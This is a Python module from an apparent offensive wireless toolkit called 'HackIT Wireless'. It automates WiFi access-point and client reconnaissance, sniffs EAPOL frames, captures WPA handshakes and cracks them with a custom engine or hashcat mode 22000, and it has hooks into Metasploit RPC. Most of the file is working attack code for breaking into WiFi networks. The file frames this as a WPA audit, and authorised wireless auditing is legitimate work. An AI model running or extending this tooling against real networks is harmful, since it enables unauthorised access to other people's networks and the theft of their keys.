import os, sys, subprocess, json, time, glob, re, shutil, signal, threading, uuid, datetime as dt, struct, socket
from pathlib import Path
from typing import Optional
from rich.live import Live
from rich.table import Table
from rich.console import Console, Group
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from concurrent.futures import ThreadPoolExecutor

from .engine_bridge import EngineBridge, EngineBuildError
from .data_parser import DataParser
from .ui_renderer import UIRenderer as UI
from .plugins import PluginEngine

_console = Console()
BASE = Path(__file__).parent
BROADCAST_MAC = "FF:FF:FF:FF:FF:FF"


# ── Background job manager ────────────────────────────────────

class JobManager:
    _jobs: dict[str, dict] = {}
    _lock = threading.Lock()
    _counter = 0

    @classmethod
    def start(cls, name: str, proc: subprocess.Popen) -> str:
        with cls._lock:
            cls._counter += 1
            jid = f"JOB-{cls._counter:04d}"
            cls._jobs[jid] = {
                "id": jid, "name": name, "proc": proc,
                "started": dt.datetime.now().isoformat(),
                "status": "running",
            }
            return jid

    @classmethod
    def stop(cls, jid: str) -> bool:
        with cls._lock:
            job = cls._jobs.get(jid)
            if not job:
                return False
            proc: subprocess.Popen = job["proc"]
            if proc.poll() is None:
                if os.name == "nt":
                    subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)], capture_output=True)
                else:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.terminate()
            job["status"] = "stopped"
            return True

    @classmethod
    def stop_all(cls):
        with cls._lock:
            for jid, job in list(cls._jobs.items()):
                proc: subprocess.Popen = job["proc"]
                if proc.poll() is None:
                    proc.terminate()
                job["status"] = "stopped"

    @classmethod
    def list_jobs(cls) -> list[dict]:
        with cls._lock:
            return [
                {"id": j["id"], "name": j["name"], "status": j["status"],
                 "started": j["started"], "running": j["proc"].poll() is None}
                for j in cls._jobs.values()
            ]


# ── Helper ────────────────────────────────────────────────────

def _which(name: str) -> Optional[str]:
    return shutil.which(name)


# ── Main Executor ─────────────────────────────────────────────

class HackITWirelessExecutor:
    def __init__(self):
        self.bridge = EngineBridge()
        self.jobs = JobManager()
        self._pool = ThreadPoolExecutor(max_workers=4)
        self.plugins = PluginEngine()

    def _default_iface(self) -> str:
        adapters = self.detect_wireless_adapters()
        if adapters:
            return adapters[0]["name"]
        return ""

    @staticmethod
    def _detect_gateway() -> str:
        try:
            r = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                parts = line.split()
                for i, p in enumerate(parts):
                    if p == "via" and i + 1 < len(parts):
                        return parts[i + 1]
        except:
            pass
        return ""

    @staticmethod
    def _random_ssid() -> str:
        suffixes = ["WiFi", "AP", "NET", "5G", "GUEST", "HOME", "LINK", "NODE"]
        t = int(time.time() * 1000)
        return f"{suffixes[t % len(suffixes)]}_{t % 10000}"

    # ── Internal plugin helpers (auto-integrated into main engine) ──

    def _plugin_lua(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None) -> Optional[str]:
        if not self.plugins.lua.available():
            return None
        proc = self.plugins.lua.run_stream(script, args)
        if proc:
            return self.jobs.start(f"lua-{script}", proc)
        return None

    def _plugin_ruby(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None) -> Optional[str]:
        if not self.plugins.ruby.available():
            return None
        proc = self.plugins.ruby.run_stream(script, args)
        if proc:
            return self.jobs.start(f"ruby-{script}", proc)
        return None

    def _plugin_msf(self, workspace: str = "default", resource: Optional[str] = None) -> Optional[str]:
        if not self.plugins.ruby.available():
            return None
        return self.plugins.ruby.run_msf_rpc(workspace, resource)

    def _plugin_python(self, script: str, args: Optional[list[str]] = None) -> Optional[str]:
        if not os.path.isfile(script):
            return None
        cmd = [sys.executable or "python3", script]
        if args: cmd.extend(args)
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            jid = self.jobs.start(f"plugin-py-{os.path.basename(script)}", proc)
            UI.print_success(f"Python plugin started (job {jid})")
        except Exception as e:
            UI.print_error(f"Plugin failed: {e}")

    # ── Adapter detection ──────────────────────────────────────

    @staticmethod
    def detect_wireless_adapters() -> list[dict]:
        adapters = []
        try:
            if os.name == "nt":
                raw = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True)
                curr = {}
                for line in raw.splitlines():
                    line = line.strip()
                    if ":" in line:
                        k, _, v = line.partition(":")
                        k = k.strip().lower()
                        v = v.strip()
                        if k == "name":
                            if curr:
                                adapters.append(curr)
                            curr = {"name": v}
                        elif "description" in k:
                            curr["driver"] = v
                        elif "physical address" in k:
                            curr["mac"] = v.upper()
                        elif "state" in k:
                            curr["status"] = v
                if curr:
                    adapters.append(curr)
            else:
                raw = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
                curr = {}
                for line in raw.splitlines():
                    line = line.strip()
                    if line.startswith("Interface"):
                        if curr:
                            adapters.append(curr)
                        curr = {"name": line.split()[-1], "channel": 0, "signal_dbm": -70,
                                "is_monitor": False, "mac": "N/A", "driver": "?", "frequency": 0,
                                "txpower": 0, "type": "managed", "phy": "?"}
                    elif "addr" in line.lower() and curr:
                        parts = line.split()
                        if len(parts) >= 2:
                            curr["mac"] = parts[-1].upper()
                    elif "type" in line.lower() and curr:
                        t = line.split()[-1].lower()
                        curr["type"] = t
                        curr["is_monitor"] = "monitor" in t
                if curr:
                    adapters.append(curr)

                for a in adapters:
                    name = a["name"]
                    try:
                        info = subprocess.check_output(["iw", "dev", name, "info"], text=True, stderr=subprocess.DEVNULL)
                        for ln in info.splitlines():
                            l = ln.strip().lower()
                            if "channel" in l and a["channel"] == 0:
                                for w in l.split():
                                    if w.isdigit() and 1 <= int(w) <= 200:
                                        a["channel"] = int(w)
                                        break
                            if "txpower" in l:
                                try:
                                    a["txpower"] = float(l.split()[-2])
                                except: pass
                            if "addr" in l and "mac" not in l.lower():
                                parts = l.split()
                                if len(parts) >= 2:
                                    a["mac"] = parts[-1].upper()
                    except: pass

                    try:
                        link = subprocess.check_output(["iw", "dev", name, "link"], text=True, stderr=subprocess.DEVNULL)
                        for ln in link.splitlines():
                            l = ln.strip().lower()
                            if "signal:" in l:
                                try:
                                    a["signal_dbm"] = int(l.split("signal:")[-1].strip().split()[0])
                                except: pass
                            if "freq:" in l:
                                try:
                                    a["frequency"] = int(l.split("freq:")[-1].strip().split()[0])
                                except: pass
                            if "ssid:" in l:
                                a["ssid"] = l.split("ssid:")[-1].strip()
                    except: pass

                    try:
                        driver_out = subprocess.check_output(["ethtool", "-i", name], text=True, stderr=subprocess.DEVNULL)
                        for ln in driver_out.splitlines():
                            l = ln.strip().lower()
                            if l.startswith("driver:"):
                                a["driver"] = l.split("driver:")[-1].strip()
                                break
                    except: pass

                    try:
                        phy_out = subprocess.check_output(["iw", "dev", name, "info"], text=True, stderr=subprocess.DEVNULL)
                        for ln in phy_out.splitlines():
                            if "wiphy" in ln.lower():
                                a["phy"] = ln.split()[-1]
                                break
                    except: pass

                    try:
                        proc = subprocess.check_output(["cat", "/proc/net/wireless"], text=True, stderr=subprocess.DEVNULL)
                        for ln in proc.splitlines():
                            if name in ln:
                                cols = ln.split()
                                if len(cols) >= 4:
                                    try:
                                        a["signal_dbm"] = int(cols[3].rstrip("."))
                                    except: pass
                    except: pass
        except Exception:
            pass
        return adapters

    # ── Build system ───────────────────────────────────────────

    def do_build(self, component: str = "all"):
        if component == "all":
            UI.print_info("Building all wireless engines...")
        else:
            UI.print_info(f"Building {component}...")

        results = self.bridge.build_all(lambda eng, msg: UI.print_info(f"  [{eng}] {msg}"))

        UI.print_success("Build Results:")
        for eng, ok in results.items():
            status = "[bold green]OK[/bold green]" if ok else "[bold red]FAILED[/bold red]"
            UI.print_raw(f"  • {eng}: {status}")

    # ── Self-contained engine info ──────────────────────────────

    def check_dependencies(self):
        _console.print("[dim]HackIT Wireless — self-contained multi-engine suite[/dim]")

    # ════════════════════════════════════════════════════════════
    # PHASE 1: Wireless Reconnaissance
    # ════════════════════════════════════════════════════════════

    def do_crawl(self, interface: str = "", full: bool = False, band: str = "both", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("No wireless interface found. Specify one.")
            return

        timeout = kwargs.get("timeout", 20)
        bssid_filter = kwargs.get("bssid", "")
        output_file = kwargs.get("output", "")

        band_flag = "--band"
        band_val = "abg"
        if band == "2.4": band_val = "bg"
        elif band == "5": band_val = "a"

        UI.print_info(f"[CRAWL] Aggressive scanning on {iface} ({band}) — timeout {timeout}s...")

        airodump = shutil.which("airodump-ng")
        if airodump:
            try:
                tmp = f"/tmp/hackit_crawl_{int(time.time())}"
                cmd = ["sudo", airodump, band_flag, band_val,
                       "--manufacture", "--wps", "--uptime",
                       "--write", tmp, "--output-format", "csv",
                       "--write-interval", "3", "-t", "WPA,WPA2,WPA3,WEP,OPN"]
                if bssid_filter:
                    ch = DataParser.bssid_to_ch(iface, self._clean_bssid(bssid_filter))
                    if ch: cmd.extend(["--channel", str(ch)])
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(min(timeout, 15))
                subprocess.run(["sudo", "pkill", "-f", f"airodump-ng.*{tmp}"], capture_output=True)

                csv_path = tmp + "-01.csv"
                results = []
                if os.path.exists(csv_path):
                    with open(csv_path, errors="replace") as f:
                        raw = f.read()
                    results = DataParser.parse_airodump_csv(raw)
                    for ap in results:
                        if "bssid" in ap:
                            ap["bssid"] = self._clean_bssid(ap["bssid"])
                subprocess.run(["rm", "-f", tmp + "*"], capture_output=True)

                if not results:
                    results = self._scan_networks()

                if results:
                    table = UI.create_ap_table(f"Access Points ({len(results)}) — {band}")
                    for i, ap in enumerate(results, 1):
                        dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
                        bar = UI.signal_bar(dbm)
                        vendor = UI._oui_lookup(ap.get("bssid", ""))
                        crypto = ap.get("encrypt", ap.get("security", "?"))
                        wps = "WPS" if ap.get("wps") else ""
                        ch = ap.get("channel", "?")
                        table.add_row(str(i), ap.get("ssid", "<hidden>"),
                                      ap.get("bssid", "?"), str(ch), f"{dbm} dBm",
                                      bar, vendor, crypto, wps)
                    _console.print(table)
                    if output_file:
                        with open(output_file, "w") as f:
                            json.dump(results, f, indent=2)
                        UI.print_success(f"Saved {len(results)} APs to {output_file}")
                else:
                    UI.print_warning("No APs found. Try: set monitor mode first")
            except Exception as e:
                UI.print_error(f"Crawl failed: {e}")
        else:
            results = self._scan_networks()
            if results:
                table = UI.create_ap_table(f"Access Points in Range ({len(results)})")
                for i, ap in enumerate(results, 1):
                    dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
                    bar = UI.signal_bar(dbm)
                    vendor = UI._oui_lookup(ap.get("bssid", ""))
                    crypto = ap.get("encrypt", ap.get("security", "?"))
                    table.add_row(str(i), ap.get("ssid", "<hidden>"),
                                  ap.get("bssid", "?"), str(ap.get("channel", "?")),
                                  f"{dbm} dBm", bar, vendor, crypto)
                _console.print(table)
            else:
                UI.print_warning("No APs found. Install aircrack-ng for deeper scan.")

        if full:
            self._deep_scan(iface)

    @staticmethod
    def _clean_bssid(raw: str) -> str:
        bssid = raw.replace("\\", "").replace("(on ", "").replace(")", "").strip()
        parts = bssid.replace("-", ":").split(":")
        clean = [p.strip().upper().zfill(2) for p in parts if len(p.strip()) <= 2]
        if len(clean) == 6:
            return ":".join(clean)
        return bssid.upper()

    def _scan_networks(self) -> list[dict]:
        results = []
        try:
            if os.name == "nt":
                raw = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, text=True)
                results = DataParser.parse_netsh_wlan(raw)
            else:
                raw = subprocess.check_output(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "dev", "wifi", "list"], text=True)
                results = DataParser.parse_nmcli_wifi(raw)
                for ap in results:
                    if "bssid" in ap:
                        ap["bssid"] = self._clean_bssid(ap["bssid"])
        except Exception:
            pass
        return results

    def _deep_scan(self, iface: str):
        UI.print_info("Deep scan: probing stations, hidden SSIDs, WPA3 detect...")
        all_aps = []
        try:
            raw = subprocess.check_output(["iw", "dev", iface, "scan", "-u"], text=True, stderr=subprocess.DEVNULL, timeout=30)
            curr = {}
            for line in raw.splitlines():
                line = line.strip()
                if line.startswith("BSS "):
                    if curr and "bssid" in curr:
                        all_aps.append(curr)
                    raw_bssid = line[4:].split()[0] if len(line) > 4 else ""
                    curr = {"bssid": self._clean_bssid(raw_bssid)}
                elif "freq:" in line and curr:
                    freq = line.split()[-1]
                    if freq.isdigit():
                        curr["channel"] = str(DataParser.freq_to_channel(int(freq)))
                        curr["freq"] = freq
                elif "signal:" in line and curr:
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if p.isdigit() or (p.startswith("-") and p[1:].isdigit()):
                            curr["signal"] = f"{int(p)} dBm"
                            break
                elif "SSID:" in line and curr:
                    curr["ssid"] = line[5:].strip() or "<hidden>"
                elif "WPA:" in line and curr:
                    curr["encrypt"] = "WPA"
                elif "RSN:" in line and curr:
                    curr["encrypt"] = curr.get("encrypt", "") + "+WPA2" if "WPA" in curr.get("encrypt","") else "WPA2"
                elif "Group cipher:" in line and curr:
                    curr["cipher"] = line.split(":")[-1].strip()
                elif "Authentication" in line and "SAE" in line and curr:
                    curr["wpa3"] = True
                    curr["encrypt"] = "WPA3"
            if curr and "bssid" in curr:
                all_aps.append(curr)
            UI.print_success(f"Deep scan: {len(all_aps)} APs (WPA3: {sum(1 for a in all_aps if a.get('wpa3'))})")
            table = UI.create_ap_table(f"Deep Scan Results ({len(all_aps)})")
            for ap in all_aps:
                dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
                bar = UI.signal_bar(dbm)
                vendor = UI._oui_lookup(ap.get("bssid", ""))
                tag = "WPA3" if ap.get("wpa3") else ap.get("encrypt", "?")
                table.add_row(ap.get("ssid","<hidden>"), ap.get("bssid","?"), str(ap.get("channel","?")), f"{dbm} dBm", bar, vendor, tag)
            _console.print(table)
        except subprocess.TimeoutExpired:
            UI.print_warning("Deep scan timed out (scan too many APs in range)")
        except Exception as e:
            UI.print_error(f"Deep scan failed: {e}")

    def do_aggressive_scan(self, interface: str = "", band: str = "both", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return
        UI.print_info(f"Aggressive multi-channel scan on {iface} ({band})...")

        channels = {"2.4": list(range(1, 14)), "5": [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]}
        targets = []
        if band in ("both", "2.4"):
            targets.extend(channels["2.4"])
        if band in ("both", "5"):
            targets.extend(channels["5"])

        all_aps = []
        for ch in targets:
            try:
                subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True, text=True)
                time.sleep(0.05)
                raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=5)
                curr = {}
                for line in raw.splitlines():
                    line = line.strip()
                    if line.startswith("BSS "):
                        if curr and "bssid" in curr:
                            all_aps.append(curr)
                        curr = {"bssid": line.split()[1].upper(), "channel": str(ch)}
                    elif "SSID:" in line:
                        curr["ssid"] = line[5:].strip() or "<hidden>"
                    elif "signal:" in line:
                        curr["signal"] = line.split()[-2] + " dBm"
                if curr:
                    all_aps.append(curr)
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
                continue

        unique = {ap["bssid"]: ap for ap in all_aps if "bssid" in ap}.values()
        table = UI.create_ap_table(f"Aggressive Scan Complete — {len(unique)} APs")
        for i, ap in enumerate(sorted(unique, key=lambda x: int(DataParser.signal_to_dbm(x.get("signal", "0"))), reverse=True), 1):
            dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
            table.add_row(
                str(i), ap.get("ssid", "<hidden>"), ap.get("bssid", "?"),
                str(ap.get("channel", "?")), f"{dbm} dBm", UI.signal_bar(dbm),
                UI._oui_lookup(ap.get("bssid", "")), ap.get("encrypt", "?")
            )
        _console.print(table)

    def do_client_hunt(self, interface: str = "", bssid: str = "", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return
        UI.print_info(f"Hunting clients on {iface} (filter: {bssid or 'all'})...")

        try:
            raw = subprocess.check_output(["iw", "dev", iface, "station", "dump"], text=True, stderr=subprocess.DEVNULL)
            table = UI.create_client_table()
            curr = {}
            for line in raw.splitlines():
                line = line.strip()
                if line.startswith("Station "):
                    if curr:
                        table.add_row(*UI.fill_client_row(
                            curr.get("mac", "?"), bssid or curr.get("bssid", "?") if hasattr(curr, 'bssid') else bssid or "?",
                            curr.get("signal", -100), curr.get("probes", ""), curr.get("last_seen", "")
                        ))
                    curr = {"mac": line.split()[1].upper()}
                elif "signal avg:" in line:
                    try:
                        curr["signal"] = int(line.split()[1])
                    except ValueError:
                        curr["signal"] = -100
                elif "connected time:" in line:
                    curr["last_seen"] = f"{line.split()[-1]}s ago"
            if curr:
                table.add_row(*UI.fill_client_row(curr.get("mac", "?"), bssid or "?",
                                                 curr.get("signal", -100), "", ""))
            _console.print(table)
        except Exception as e:
            UI.print_error(f"Client hunt failed: {e}")

    def do_wpa3_detect(self, interface: str = "", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return
        UI.print_info(f"Detecting WPA3/SAE APs on {iface}...")
        results = self._scan_networks()
        wpa3_aps = [ap for ap in results if "SAE" in ap.get("security", ap.get("encrypt", "")).upper()
                    or "WPA3" in ap.get("security", ap.get("encrypt", "")).upper()
                    or "OWE" in ap.get("security", ap.get("encrypt", "")).upper()]

        if not wpa3_aps:
            UI.print_warning("No WPA3/SAE networks detected (or scanning only shows WPA2).")
            UI.print_info("WPA3 networks often hide SSID; try aggressive scan on 5 GHz.")
            return

        table = Table(title=f"[bold cyan]WPA3/SAE Networks ({len(wpa3_aps)})[/bold cyan]", border_style="green")
        table.add_column("SSID", style="white")
        table.add_column("BSSID", style="cyan")
        table.add_column("Ch", justify="center", style="yellow")
        table.add_column("Signal", style="green")
        table.add_column("Security", style="red")
        for ap in wpa3_aps:
            table.add_row(ap.get("ssid", "?"), ap.get("bssid", "?"), str(ap.get("channel", "?")),
                          str(ap.get("signal", "?")), ap.get("security", ap.get("encrypt", "?")))
        _console.print(table)

    def do_hidden_ssid(self, interface: str = "", **kwargs):
        iface = interface or self._default_iface()
        UI.print_info(f"Scanning for hidden SSIDs on {iface}...")
        try:
            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=15)
            hidden = []
            curr = {}
            for line in raw.splitlines():
                line = line.strip()
                if line.startswith("BSS "):
                    if curr and ("ssid" not in curr or not curr["ssid"]):
                        hidden.append(curr.get("bssid", "?"))
                    curr = {"bssid": line.split()[1].upper()}
                elif "SSID:" in line:
                    curr["ssid"] = line[5:].strip()
            if hidden:
                UI.print_success(f"Found {len(hidden)} hidden SSID(s):")
                for bssid in hidden:
                    _console.print(f"  [cyan]{bssid}[/cyan] [dim](empty probe response)[/dim]")
            else:
                UI.print_warning("No hidden SSIDs detected.")
        except Exception as e:
            UI.print_error(f"Hidden SSID scan failed: {e}")

    def do_probe_monitor(self, interface: str = "", **kwargs):
        iface = interface or self._default_iface()
        UI.print_info(f"Monitoring probe requests on {iface} (Ctrl+C to stop)...")
        try:
            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=10)
            probes = set()
            for line in raw.splitlines():
                m = re.search(r'Probe Response from ([0-9A-Fa-f:]{17})', line)
                if m:
                    probes.add(m.group(1).upper())
            if probes:
                UI.print_success(f"Probe responses from {len(probes)} station(s):")
                for p in sorted(probes):
                    vendor = UI._oui_lookup(p)
                    _console.print(f"  [cyan]{p}[/cyan] [dim]({vendor})[/dim]")
            else:
                UI.print_info("No probe responses captured. Enable monitor mode for better results.")
        except Exception as e:
            UI.print_error(f"Probe monitor failed: {e}")

    def do_beacon_analyze(self, interface: str = "", **kwargs):
        UI.print_info("Beacon frame analysis requires monitor mode and packet capture.")
        UI.print_info("Use: mode <iface> monitor, then capture <iface> output.pcap")
        UI.print_info("Then analyze with: tshark -r output.pcap -Y wlan.fc.type_subtype==8")

    def do_signal_monitor(self, interface: str = "", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return
        UI.print_info(f"Live signal monitor on {iface} (Ctrl+C to stop)...")
        try:
            while True:
                raw = subprocess.check_output(["iw", "dev", iface, "link"], text=True, stderr=subprocess.DEVNULL)
                dbm = -100
                ssid = "Not connected"
                for line in raw.splitlines():
                    m = re.search(r'signal: (-?\d+)', line)
                    if m:
                        dbm = int(m.group(1))
                    m2 = re.search(r'SSID:\s*(.*)', line)
                    if m2:
                        ssid = m2.group(1).strip()
                bar = UI.signal_bar(dbm)
                sys.stdout.write(f"\r  {bar} {dbm:>3} dBm | {ssid:<30}")
                sys.stdout.flush()
                time.sleep(0.5)
        except KeyboardInterrupt:
            print()

    def do_map(self, interface: str = "", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return

        from .oui_db import lookup as oui_lookup
        aps: list[dict] = []
        seen_bssid: set[str] = set()

        _console.print(f"  [dim]Scanning {iface}...[/dim]")

        try:
            raw = subprocess.check_output(
                ["iw", "dev", iface, "scan", "-u"],
                text=True, stderr=subprocess.DEVNULL, timeout=5,
            )
            curr: dict[str, str] = {}
            for line in raw.splitlines():
                ls = line.strip()
                if ls.startswith("BSS "):
                    if curr and "bssid" in curr:
                        aps.append(curr)
                    raw_bssid = ls[4:].split()[0] if len(ls) > 4 else ""
                    curr = {"bssid": self._clean_bssid(raw_bssid)}
                elif ls.startswith("SSID:") and curr:
                    curr["ssid"] = ls[5:].strip() or "<hidden>"
                elif ls.startswith("freq:") and curr:
                    f = ls.split()[-1]
                    if f.isdigit():
                        curr["channel"] = str(DataParser.freq_to_channel(int(f)))
                elif ls.startswith("signal:") and curr:
                    parts = ls.split()
                    for i, p in enumerate(parts):
                        if p.lstrip("-").isdigit():
                            curr["signal"] = f"{p} dBm"
                            break
            if curr and "bssid" in curr:
                aps.append(curr)
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
            pass

        if not aps:
            aps = self._scan_networks()

        if not aps:
            UI.print_warning("No APs found.")
            return

        vendors: dict[str, list[str]] = {}
        for ap in aps:
            bssid = ap.get("bssid", "")
            if not bssid or bssid in seen_bssid:
                continue
            seen_bssid.add(bssid)
            vendor = oui_lookup(bssid)
            ssid = ap.get("ssid", "<hidden>") or "<hidden>"
            vendors.setdefault(vendor, []).append(f"{ssid} ({bssid}) -> {vendor}")

        _console.print("\n[bold cyan]AP Topology Map (BSSID → Vendor correlation):[/bold cyan]")
        for vendor, nets in sorted(vendors.items()):
            _console.print(f"\n[bold]{vendor}[/bold] ({len(nets)})")
            for n in nets:
                _console.print(f"  └─ [white]{n}[/white]")

    # ════════════════════════════════════════════════════════════
    # PHASE 2: Packet Capture & Monitoring
    # ════════════════════════════════════════════════════════════

    def run_sniff(self, interface: str, monitor: bool = False, filters: str = "", verbose: bool = False, count: int = 0, output: Optional[str] = None, **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return
        try:
            proc = self.bridge.rust_sniff(iface, monitor, filters)
        except EngineBuildError as e:
            UI.print_error(str(e))
            return

        table = UI.create_target_table()
        try:
            with Live(table, refresh_per_second=4):
                for line in proc.stdout:
                    line = line.strip()
                    if not line:
                        continue
                    data = DataParser.parse_telemetry(line)
                    if not data:
                        continue
                    event = data.get("event", "other")
                    bssid = data.get("bssid", "??:??:??:??:??:??")
                    size = str(data.get("size", 0))
                    if event == "beacon":
                        table.add_row(bssid, "802.11 Beacon", f"SSID: {data.get('ssid', 'N/A')}", size)
                    elif event == "eapol_handshake":
                        step = data.get("step", 1)
                        msgs = {1: "ANonce", 2: "SNonce+MIC", 3: "GTK", 4: "Confirmed"}
                        table.add_row(bssid, "EAPOL", f"Step {step}/4 {msgs.get(step, '')}", size)
                    elif event == "deauth":
                        table.add_row(bssid, "Deauth", data.get("raw", ""), size)
                    elif event == "probe":
                        table.add_row(bssid, "Probe", data.get("raw", ""), size)
                    else:
                        table.add_row(bssid, "Data", "802.11 frame", size)
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            UI.print_warning("Sniffer stopped.")

    def do_capture(self, iface: str, output: str = "capture.pcap", snaplen: int = 4096, timeout: int = 0, **kwargs):
        iface = iface or self._default_iface()
        try:
            proc = self.bridge.rust_capture(iface, output)
        except EngineBuildError as e:
            UI.print_error(str(e))
            return
        UI.print_info(f"Capturing on {iface} → {output} (Ctrl+C to stop)...")
        try:
            for line in proc.stdout:
                line = line.strip()
                if line:
                    _console.print(f"  {line}")
            proc.wait()
            UI.print_success(f"Capture saved to {output}")
        except KeyboardInterrupt:
            proc.terminate()
            UI.print_warning("Capture stopped.")

    def do_handshake_capture(self, iface: str, bssid: str = "", timeout: int = 30, deauth: bool = False, output: str = "", **kwargs):
        iface = iface or self._default_iface()
        output = f"handshake_{bssid.replace(':','') if bssid else int(time.time())}.pcap"
        try:
            proc = self.bridge.rust_handshake(iface, bssid, output, timeout)
        except EngineBuildError as e:
            UI.print_error(str(e))
            return
        UI.print_info(f"Hunting handshake on {iface} for {timeout}s → {output}")
        try:
            for line in proc.stdout:
                line = line.strip()
                if line:
                    _console.print(f"  {line}")
            proc.wait()
            if os.path.exists(output):
                UI.print_success(f"Handshake saved: {output}")
            else:
                UI.print_warning(f"No handshake captured in {timeout}s. Try closer range or deauth.")
        except KeyboardInterrupt:
            proc.terminate()
            UI.print_warning("Handshake capture stopped.")

    def do_sessions(self, json_output: bool = False, **kwargs):
        patterns = [
            str(BASE / "handshakes" / "*.pcap"),
            str(BASE / "captures" / "*.pcap"),
            str(BASE / "*.pcap"),
        ]
        pcap_files = []
        for p in patterns:
            pcap_files.extend(glob.glob(p))

        if not pcap_files:
            UI.print_warning("No capture sessions found.")
            return

        table = Table(title="[bold cyan]Capture Sessions[/bold cyan]", border_style="cyan")
        table.add_column("File", style="cyan")
        table.add_column("Size", justify="right", style="green")
        table.add_column("Modified", style="dim")
        table.add_column("Handshakes", justify="center", style="yellow")
        table.add_column("Status", style="white")

        for f in sorted(pcap_files):
            stat = os.stat(f)
            hs_count = len(DataParser.parse_tshark_handshake(f))
            status = "[bold green]✓ Valid[/bold green]" if hs_count > 0 else "[dim]No EAPOL[/dim]"
            table.add_row(
                os.path.basename(f),
                f"{stat.st_size:,} B",
                dt.datetime.fromtimestamp(stat.st_mtime).strftime("%H:%M:%S"),
                str(hs_count),
                status,
            )
        _console.print(table)

    def do_replay(self, pcap_file: str, loop: bool = False, speed: int = 1, bpf: Optional[str] = None, count: int = 0, **kwargs):
        if not os.path.exists(pcap_file):
            UI.print_error(f"File not found: {pcap_file}")
            return
        if shutil.which("wireshark"):
            subprocess.Popen(["wireshark", "-r", pcap_file])
            UI.print_success(f"Opening {pcap_file} in Wireshark...")
        elif shutil.which("tshark"):
            UI.print_info(f"Analyzing {pcap_file} with tshark...")
            result = subprocess.run(["tshark", "-r", pcap_file, "-Y", "eapol || wlan.fc.type_subtype==8 || wlan.fc.type_subtype==4",
                                     "-T", "fields", "-e", "frame.number", "-e", "wlan.sa", "-e", "wlan.da",
                                     "-e", "wlan.fc.type_subtype"], capture_output=True, text=True)
            _console.print(Panel(result.stdout[:3000] or result.stderr[:1000] or "No output",
                                 title="[bold]PCAP Analysis[/bold]", border_style="blue"))
        else:
            UI.print_warning("Install Wireshark or tshark to replay/analyze captures.")

    # ════════════════════════════════════════════════════════════
    # PHASE 3: WPA/WPA2/WPA3 Audit
    # ════════════════════════════════════════════════════════════

    def do_crack(self, hashfile: str, wordlist: str, rules: Optional[str] = None, timeout: int = 0, session: Optional[str] = None, **kwargs):
        if not os.path.exists(hashfile):
            UI.print_error(f"Hash file not found: {hashfile}")
            return
        if not os.path.exists(wordlist):
            UI.print_error(f"Wordlist not found: {wordlist}")
            return

        try:
            proc = self.bridge.go_crack(hashfile, wordlist)
        except EngineBuildError as e:
            UI.print_error(str(e))
            return

        jid = self.jobs.start(f"crack-{os.path.basename(hashfile)}", proc)
        UI.print_success(f"Crack job {jid} started.")

        total = 0
        try:
            with open(wordlist) as f:
                total = sum(1 for _ in f)
        except Exception:
            total = 0

        start = time.time()
        try:
            for line in proc.stdout:
                line = line.strip()
                if not line:
                    continue
                data = DataParser.parse_telemetry(line)
                if data and data.get("event") == "crack_progress":
                    tested = data.get("tested", 0)
                    rate = data.get("rate", 0)
                    elapsed = time.time() - start
                    panel = UI.render_crack_progress(tested, total or 1, rate, "", elapsed)
                    _console.clear()
                    _console.print(panel)
                elif data and data.get("event") == "key_found":
                    UI.print_success(f"KEY FOUND: {data['key']}")
                else:
                    _console.print(f"  {line}")
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            UI.print_warning("Crack interrupted.")
        finally:
            elapsed = time.time() - start
            UI.print_info(f"Crack job completed in {elapsed:.1f}s")

    def do_hashcat(self, hashfile: str, wordlist: str, extra_args: str = ""):
        if not shutil.which("hashcat"):
            UI.print_error("hashcat not found. Install it first.")
            return
        if not os.path.exists(hashfile):
            UI.print_error(f"Hash file not found: {hashfile}")
            return
        cmd = ["hashcat", "-m", "22000", hashfile, wordlist, "--force", "--status", "--status-timer=1"]
        if extra_args:
            cmd.extend(shlex.split(extra_args))
        UI.print_success(f"hashcat: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd)
        jid = self.jobs.start("hashcat", proc)
        UI.print_info(f"hashcat job {jid} running in background.")
        try:
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
